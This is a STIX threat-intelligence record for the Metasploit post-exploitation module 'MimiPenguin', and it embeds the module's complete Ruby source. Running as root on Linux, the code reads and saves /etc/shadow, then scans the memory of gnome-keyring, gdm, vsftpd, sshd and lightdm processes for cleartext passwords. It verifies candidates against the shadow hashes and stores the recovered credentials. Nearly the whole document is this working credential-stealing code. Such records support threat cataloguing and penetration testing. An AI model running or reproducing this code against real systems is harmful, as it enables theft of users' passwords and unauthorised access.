{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a670094-d301-4633-8ddc-9234ff222e9e",
    "created": "2024-08-14T16:33:15.125437Z",
    "modified": "2024-08-14T16:33:15.125441Z",
    "name": "MimiPenguin",
    "description": " This searches process memory for needles that indicate where cleartext passwords may be located. If any needles are discovered in the target process memory, collected strings in adjacent memory will be hashed and compared with password hashes found in `/etc/shadow`.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/mimipenguin.rb",
            "external_id": "mimipenguin.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/huntergregal/mimipenguin"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.launchpad.net/ubuntu/+source/gnome-keyring/+bug/1772919"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.launchpad.net/ubuntu/+source/lightdm/+bug/1717490"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-20781"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'unix_crypt'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MimiPenguin',\n        'Description' => %q{\n          This searches process memory for needles that indicate\n          where cleartext passwords may be located. If any needles\n          are discovered in the target process memory, collected\n          strings in adjacent memory will be hashed and compared\n          with password hashes found in `/etc/shadow`.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'huntergregal', # MimiPenguin\n          'bcoles', # original MimiPenguin module, table and python code\n          'Shelby Pace' # metasploit module\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_AARCH64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'URL', 'https://github.com/huntergregal/mimipenguin' ],\n          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/gnome-keyring/+bug/1772919' ],\n          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/lightdm/+bug/1717490' ],\n          [ 'CVE', '2018-20781' ]\n        ],\n        'DisclosureDate' => '2018-05-23',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_attach\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_search\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def get_user_names_and_hashes\n    shadow_contents = read_file('/etc/shadow')\n    fail_with(Failure::UnexpectedReply, \"Failed to read '/etc/shadow'\") if shadow_contents.blank?\n    vprint_status('Storing shadow file...')\n    store_loot('shadow.file', 'text/plain', session, shadow_contents, nil)\n\n    users = []\n    lines = shadow_contents.split\n    lines.each do |line|\n      line_arr = line.split(':')\n      next if line_arr.empty?\n\n      user_name = line_arr&.first\n      hash = line_arr&.second\n      next unless hash.start_with?('$')\n      next if hash.nil? || user_name.nil?\n\n      users << { 'username' => user_name, 'hash' => hash }\n    end\n\n    users\n  end\n\n  def configure_passwords(user_data = [])\n    user_data.each do |info|\n      hash = info['hash']\n      hash_format = Metasploit::Framework::Hashes.identify_hash(hash)\n      info['type'] = hash_format.empty? ? 'unsupported' : hash_format\n\n      salt = ''\n      if info['type'] == 'bf'\n        arr = hash.split('$')\n        next if arr.length < 4\n\n        cost = arr[2]\n        salt = arr[3][0..21]\n        info['cost'] = cost\n      elsif info['type'] == 'yescrypt'\n        salt = hash[0...29]\n      else\n        salt = hash.split('$')[2]\n      end\n      next if salt.nil?\n\n      info['salt'] = salt\n    end\n\n    user_data\n  end\n\n  def get_matches(target_info = {})\n    if target_info.empty?\n      vprint_status('Invalid target info supplied')\n      return nil\n    end\n\n    target_pids = pidof(target_info['name'])\n    if target_pids.nil?\n      print_bad(\"PID for #{target_info['name']} not found.\")\n      return nil\n    end\n\n    target_info['matches'] = {}\n    target_info['pids'] = target_pids\n    target_info['pids'].each_with_index do |target_pid, _ind|\n      vprint_status(\"Searching PID #{target_pid}...\")\n      res = mem_search_ascii(5, 500, target_info['needles'], pid: target_pid)\n      target_info['matches'][target_pid] = res.empty? ? nil : res\n    end\n  end\n\n  def format_addresses(addr_line)\n    address = addr_line.split&.first\n    start_addr, end_addr = address.split('-')\n    start_addr = start_addr.to_i(16)\n    end_addr = end_addr.to_i(16)\n\n    { 'start' => start_addr, 'end' => end_addr }\n  end\n\n  # Selects memory regions to read based on locations\n  # of matches\n  def choose_mem_regions(pid, match_data = [])\n    return [] if match_data.empty?\n\n    mem_regions = []\n    match_data.each do |match|\n      next unless match.key?('sect_start') && match.key?('sect_len')\n\n      start = match.fetch('sect_start')\n      len = match.fetch('sect_len')\n      mem_regions << { 'start' => start, 'length' => len }\n    end\n\n    mem_regions.uniq!\n    mem_data = read_file(\"/proc/#{pid}/maps\")\n    return mem_regions if mem_data.nil?\n\n    lines = mem_data.split(\"\\n\")\n    updated_regions = mem_regions.clone\n    if mem_regions.length == 1\n      match_addr = mem_regions[0]['start'].to_s(16)\n      match_ind = lines.index { |line| line.split('-').first.include?(match_addr) }\n      prev = lines[match_ind - 1]\n      if prev && prev.include?('00000000 00:00 0')\n        formatted = format_addresses(prev)\n        start_addr = formatted['start']\n        end_addr = formatted['end']\n        length = end_addr - start_addr\n\n        updated_regions << { 'start' => start_addr, 'length' => length }\n      end\n\n      post = lines[match_ind + 1]\n      if post && post.include?('00000000 00:00 0')\n        formatted = format_addresses(post)\n        start_addr = formatted['start']\n        end_addr = formatted['end']\n        length = end_addr - start_addr\n\n        updated_regions << { 'start' => start_addr, 'length' => length }\n      end\n\n      return updated_regions\n    end\n\n    mem_regions.each_with_index do |region, index|\n      next if index == 0\n\n      first_addr = mem_regions[index - 1]['start']\n      curr_addr = region['start']\n      first_addr = first_addr.to_s(16)\n      curr_addr = curr_addr.to_s(16)\n      first_index = lines.index { |line| line.start_with?(first_addr) }\n      curr_index = lines.index { |line| line.start_with?(curr_addr) }\n      next if first_index.nil? || curr_index.nil?\n\n      between_vals = lines.values_at(first_index + 1...curr_index)\n      between_vals = between_vals.select { |line| line.include?('00000000 00:00 0') }\n      if between_vals.empty?\n        next unless region == mem_regions.last\n\n        adj_region = lines[curr_index + 1]\n        return updated_regions if adj_region.nil?\n\n        formatted = format_addresses(adj_region)\n        start_addr = formatted['start']\n        end_addr = formatted['end']\n        length = end_addr - start_addr\n        updated_regions << { 'start' => start_addr, 'length' => length }\n        return updated_regions\n      end\n\n      between_vals.each do |addr_line|\n        formatted = format_addresses(addr_line)\n        start_addr = formatted['start']\n        end_addr = formatted['end']\n        length = end_addr - start_addr\n        updated_regions << { 'start' => start_addr, 'length' => length }\n      end\n    end\n\n    updated_regions\n  end\n\n  def get_printable_strings(pid, start_addr, section_len)\n    lines = []\n    curr_addr = start_addr\n    max_addr = start_addr + section_len\n\n    while curr_addr < max_addr\n      data = mem_read(curr_addr, 1000, pid: pid)\n      lines << data.split(/[^[:print:]]/)\n      lines = lines.flatten\n      curr_addr += 800\n    end\n\n    lines.reject! { |line| line.length < 4 }\n    lines\n  end\n\n  def get_python_version\n    @python_vers ||= command_exists?('python3') ? 'python3' : ''\n\n    if @python_vers.empty?\n      @python_vers ||= command_exists?('python') ? 'python' : ''\n    end\n  end\n\n  def check_for_valid_passwords(captured_strings, user_data, process_name)\n    captured_strings.each do |str|\n      user_data.each do |pass_info|\n        salt = pass_info['salt']\n        hash = pass_info['hash']\n        pass_type = pass_info['type']\n\n        case pass_type\n        when 'md5'\n          hashed = UnixCrypt::MD5.build(str, salt)\n        when 'bf'\n          BCrypt::Engine.cost = pass_info['cost'] || 12\n          hashed = BCrypt::Engine.hash_secret(str, hash[0..28])\n        when /sha256/\n          hashed = UnixCrypt::SHA256.build(str, salt)\n        when /sha512/\n          hashed = UnixCrypt::SHA512.build(str, salt)\n        when 'yescrypt'\n          get_python_version\n          next if @python_vers.empty?\n\n          if @python_vers == 'python3'\n            code = \"import crypt; import base64; print(crypt.crypt(base64.b64decode('#{Rex::Text.encode_base64(str)}').decode('utf-8'), base64.b64decode('#{Rex::Text.encode_base64(salt.to_s)}').decode('utf-8')))\"\n            cmd = \"python3 -c \\\"#{code}\\\"\"\n          else\n            code = \"import crypt; import base64; print crypt.crypt(base64.b64decode('#{Rex::Text.encode_base64(str)}'), base64.b64decode('#{Rex::Text.encode_base64(salt.to_s)}'))\"\n            cmd = \"python -c \\\"#{code}\\\"\"\n          end\n          hashed = cmd_exec(cmd).to_s.strip\n        when 'unsupported'\n          next\n        end\n\n        next unless hashed == hash\n\n        pass_info['password'] = str\n        pass_info['process'] = process_name\n      end\n    end\n  end\n\n  def run\n    fail_with(Failure::BadConfig, 'Root privileges are required') unless is_root?\n    user_data = get_user_names_and_hashes\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve user information') if user_data.empty?\n    password_data = configure_passwords(user_data)\n\n    target_proc_info = [\n      {\n        'name' => 'gnome-keyring-daemon',\n        'needles' => [\n          '^+libgck\\\\-1.so\\\\.0$',\n          'libgcrypt\\\\.so\\\\..+$',\n          'linux-vdso\\\\.so\\\\.1$',\n          'libc\\\\.so\\\\.6$'\n        ]\n      },\n      {\n        'name' => 'gdm-password',\n        'needles' => [\n          '^_pammodutil_getpwnam_root_1$',\n          '^gkr_system_authtok$'\n        ]\n      },\n      {\n        'name' => 'vsftpd',\n        'needles' => [\n          '^::.+\\\\:[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}$'\n        ]\n      },\n      {\n        'name' => 'sshd',\n        'needles' => [\n          '^sudo.+'\n        ]\n      },\n      {\n        'name' => 'lightdm',\n        'needles' => [\n          '^_pammodutil_getspnam_'\n        ]\n      }\n    ]\n\n    captured_strings = []\n    target_proc_info.each do |info|\n      print_status(\"Checking for matches in process #{info['name']}\")\n      match_set = get_matches(info)\n      if match_set.nil?\n        vprint_status(\"No matches found for process #{info['name']}\")\n        next\n      end\n\n      vprint_status('Choosing memory regions to search')\n      next if info['pids'].empty?\n      next if info['matches'].values.all?(&:nil?)\n\n      info['matches'].each do |pid, set|\n        next unless set\n\n        search_regions = choose_mem_regions(pid, set)\n        next if search_regions.empty?\n\n        search_regions.each { |reg| captured_strings << get_printable_strings(pid, reg['start'], reg['length']) }\n        captured_strings.flatten!\n        captured_strings.uniq!\n        check_for_valid_passwords(captured_strings, password_data, info['name'])\n        captured_strings = []\n      end\n    end\n\n    results = password_data.select { |res| res.key?('password') && !res['password'].nil? }\n    fail_with(Failure::NotFound, 'Failed to find any passwords') if results.empty?\n    print_good(\"Found #{results.length} valid credential(s)!\")\n\n    table = Rex::Text::Table.new(\n      'Header' => 'Credentials',\n      'Indent' => 2,\n      'SortIndex' => 0,\n      'Columns' => [ 'Process Name', 'Username', 'Password' ]\n    )\n\n    results.each do |res|\n      table << [ res['process'], res['username'], res['password'] ]\n      store_valid_credential(\n        user: res['username'],\n        private: res['password'],\n        private_type: :password\n      )\n    end\n\n    print_line\n    print_line(table.to_s)\n    path = store_loot(\n      'mimipenguin.csv',\n      'text/plain',\n      session,\n      table.to_csv,\n      nil\n    )\n\n    print_status(\"Credentials stored in #{path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-05-23",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}